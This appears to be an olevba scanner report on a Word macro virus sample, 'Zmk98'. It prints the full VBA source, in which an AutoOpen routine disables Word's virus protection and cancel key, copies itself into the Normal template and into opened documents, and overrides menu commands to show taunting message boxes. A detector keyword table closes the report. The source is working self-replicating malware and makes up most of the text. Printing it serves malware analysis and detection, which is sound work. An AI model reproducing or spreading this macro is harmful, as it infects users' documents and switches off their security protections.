olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Zmk98-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Zmk98-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sdfsg.bas 
in file: ./Virus.MSWord.Zmk98-based - OLE stream: 'Macros/VBA/sdfsg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Virus crée par ZMK98MVCK
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo Fin
iMacroCount = NormalTemplate.VbProject.VbComponent.Count
For i = 1 To iMacroCount
     If NormalTemplate.VbProject.VbComponent(i).Name = "sdfsg" Then
              sdfsgInstalled = -1
     End If
Next i
If Not sdfsgInstalled Then
      Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="sdfsg", Object:=wdOrganizerObjectProjectItems
Else
     Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="sdfsg", Object:=wdOrganizerObjectProjectItems
End If
Call PayLoad
Fin:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
Msgbox "I love you", Title:="I kill you"
ErrorFT:
End Sub
Sub PayLoad()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPL
   Msgbox "I love you", Title:="I love you"
ErrorPL:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
Msgbox "I love you", Title:="I kill you"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
Msgbox "", Title:=""
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VbProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

